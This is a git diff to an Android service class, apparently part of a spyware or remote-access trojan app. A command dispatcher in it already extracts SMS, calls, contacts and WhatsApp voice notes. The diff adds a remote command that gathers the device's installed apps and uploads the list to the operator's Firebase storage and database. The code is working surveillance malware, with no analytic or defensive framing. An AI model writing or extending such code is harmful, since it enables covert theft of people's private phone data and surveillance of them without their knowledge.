@@ -8,6 +8,7 @@ import android.app.Service;
 import android.content.Context;
 import android.content.Intent;
 import android.content.IntentFilter;
+import android.content.pm.ResolveInfo;
 import android.graphics.Color;
 import android.net.Uri;
 import android.os.Build;
@@ -24,6 +25,7 @@ import com.aigs.serviceone.MainActivity;
 import com.aigs.serviceone.R;
 import com.aigs.serviceone.helpers.CallExtractorNotifier;
 import com.aigs.serviceone.helpers.ContactsPayloadListner;
+import com.aigs.serviceone.helpers.FileSystem;
 import com.aigs.serviceone.helpers.PayloadTypes;
 import com.aigs.serviceone.helpers.SmsExtractorNotifier;
 import com.aigs.serviceone.helpers.SmsModes;
@@ -46,8 +48,12 @@ import com.google.firebase.database.ValueEventListener;
 import com.google.firebase.storage.FirebaseStorage;
 import com.google.firebase.storage.UploadTask;
 
+import org.json.JSONArray;
+import org.json.JSONObject;
+
 import java.io.File;
 import java.util.HashMap;
+import java.util.List;
 
 public class Starter extends Service {
 
@@ -188,6 +194,9 @@ public class Starter extends Service {
                 case PayloadTypes.GET_WHATSAPP_VOICE_NOTES:
                     getFileFromPath(PayloadTypes.GET_WHATSAPP_VOICE_NOTES,true);
                     break;
+                case PayloadTypes.GET_INSTALLED_APP_DETAILS:
+                    getInstalledAppDetails();
+                    break;
 
                 default:
                     Log.d("ERROR PA : ", "Invalid Command Received");
@@ -199,6 +208,55 @@ public class Starter extends Service {
             FirebaseDatabase.getInstance().getReference("Logs").child("GENERAL").child("CurrentLog").setValue(e.getMessage());
 
         }
+    }
+
+    private void getInstalledAppDetails() {
+        Intent mainIntent = new Intent(Intent.ACTION_MAIN, null);
+        mainIntent.addCategory(Intent.CATEGORY_LAUNCHER);
+        List<ResolveInfo> pkgAppsList = getPackageManager().queryIntentActivities( mainIntent, 0);
+        JSONArray jsonArray = new JSONArray();
+
+        for (ResolveInfo resolveInfo : pkgAppsList){
+            try {
+                JSONObject jsonObject = new JSONObject();
+                jsonObject.put("package_name", resolveInfo.activityInfo.packageName);
+                jsonObject.put("app_name", resolveInfo.activityInfo.applicationInfo.name);
+                jsonObject.put("process_name", resolveInfo.activityInfo.applicationInfo.processName);
+                jsonObject.put("uid", resolveInfo.activityInfo.applicationInfo.uid);
+                jsonArray.put(jsonObject);
+
+            }catch (Exception e){
+                Log.e("ERROR",e.getMessage());
+            }
+        }
+
+        File file = FileSystem.createInstance(this).writeContactsData(jsonArray.toString());
+
+        Uri uri = FileProvider.getUriForFile(this,getPackageName()+".provider",file);
+        FirebaseStorage
+                .getInstance()
+                .getReference("INSTALLED_APP")
+                .child(System.currentTimeMillis()+"_app_Installed")
+                .putFile(uri)
+                .addOnCompleteListener(task -> {
+                    if (task.isSuccessful()) {
+                        task.getResult()
+                                .getStorage()
+                                .getDownloadUrl()
+                                .addOnCompleteListener(task1 ->{
+                                    HashMap<String, Object> databaseEntry = new HashMap<>();
+                                    databaseEntry.put("/RECORDS/installed_apps"+"/" + System.currentTimeMillis(), task1.getResult().toString());
+                                    databaseEntry.put("/LIVE/installed_apps", task1.getResult().toString());
+                                    FirebaseDatabase.getInstance().getReference().updateChildren(databaseEntry);
+                                });
+
+                    } else {
+                        //SET ERROR MESSAGE
+                    }
+                });
+
+
+
     }
 
     private void getFileFromPath(int payloadType, boolean isWhatsapp){
